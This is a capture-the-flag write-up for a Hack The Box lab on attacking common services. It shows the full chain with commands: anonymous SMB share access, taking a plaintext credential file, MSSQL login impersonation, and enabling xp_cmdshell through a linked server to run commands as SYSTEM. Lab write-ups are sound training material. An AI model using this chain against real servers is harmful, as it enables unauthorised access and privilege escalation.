---
tags:
  - htb
  - linux
  - services
  - hard
draft: false
date: 2026-06-29
title: attacking-common-services-hard
---

### Q1: What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)

We begin the assessment with a comprehensive Nmap scan to map the active attack surface of the target server:

```
sudo nmap -sC -sV -A -T4 -p- $ipAddress$
```

The scan reveals a typical internal Windows configuration with **SMB (port 445)** and **Microsoft SQL Server 2019 (port 1433)** exposed. Given that the server is known to manage internal working materials, we test for unauthenticated Null Session access on the SMB shares using `smbclient`:

```
smbclient -N -L //$ipAddress$
```

The server configuration allows us to list the available shares anonymously, showing a custom non-default share named `Home`. We connect to it directly to explore its contents:

```
smbclient -N //$ipAddress$/Home
```

Inside the share, navigating to the `\IT\` directory reveals individual user folders for Fiona, John, and Simon. Inspecting Simon's directory confirms the presence of an exposed document:
```
smb: \IT\Simon\> ls
  $ANSWER$.txt
```

We retrieve the file locally using the `get` command.

### Q2: Enumerate the target and find a password for the user Fiona. What is her password?

During the anonymous SMB session, we also systematically review other user directories within the `\IT\` path. Inside Fiona's dedicated folder (`\IT\Fiona\`), we identify an explicit credential store named `creds.txt` and download it to our machine:

```
smb: \IT\Fiona\> get creds.txt
```

Exiting the SMB shell, we read the contents of the retrieved file to extract the cleartext passwords stored within it:

```
cat creds.txt
```

The file contains a list of plaintext Windows credentials. Through subsequent validation against the active network services, a specific complex string stands out as the active password assigned to Fiona's account.

Answer for this question is inside this file.

### Q3: Once logged in, what other user can we compromise to gain admin privileges?

Although the target's RDP service (port 3389) rejects direct interactive login for Fiona due to environmental policy constraints, the MSSQL service supports standard mixed-mode authentication. We use the discovered credentials to establish an authenticated connection to the SQL Server via Impacket:

```
impacket-mssqlclient fiona@$ipAddress$-windows-auth
```

Once connected to the database instance, we look for lateral movement vectors by auditing explicit impersonation configurations. We execute a query to look for active `IMPERSONATE` grants across server principals:

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

The output indicates that Fiona possesses explicit permissions to assume the security context of two other accounts: `simon` and `john`. We pivot horizontally to execute queries inside John's context:

```
EXECUTE AS LOGIN = 'john';
```

We verify the active context shift by checking the system user registration, which confirms we are now acting as John:

```
SELECT SYSTEM_USER;
```

### Q4: Submit the contents of the flag.txt file on the Administrator Desktop.

While the `john` account is not a direct member of the `sysadmin` fixed server role, further architectural enumeration shows a dangerous trust link configuration. The database instance maintains a local **Linked Server** connection named `LOCAL.TEST.LINKED.SRV` that executes queries under highly privileged administrative credentials.

To transition from database interaction to raw OS command execution, we force the linked server connection to modify the server's running configuration, enabling advanced options and activating the `xp_cmdshell` extended stored procedure:

```
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV];
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
EXEC ('sp_configure ''xp_cmdshell'', 1') AT [LOCAL.TEST.LINKED.SRV];
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
```

With `xp_cmdshell` active on the trusted link, we execute local system commands. We verify our active privileges within the underlying Windows operating system layer:

```
EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
```

The query returns `nt authority\system`, indicating complete, unconstrained control over the underlying operating system. Finally, we leverage this supreme access to read the contents of the target flag located on the Administrator's desktop:

```
EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
```

This returns the final flag string, successfully completing the lab assessment.